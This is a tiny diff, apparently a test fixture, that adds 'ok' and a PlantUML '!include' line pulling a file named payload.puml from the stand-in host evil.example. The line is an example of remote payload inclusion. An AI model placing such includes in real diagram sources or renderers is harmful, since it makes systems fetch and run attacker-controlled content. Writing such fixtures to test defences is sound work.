@@ -1,0 +1,2 @@
+ok
+!include http://evil.example/payload.puml
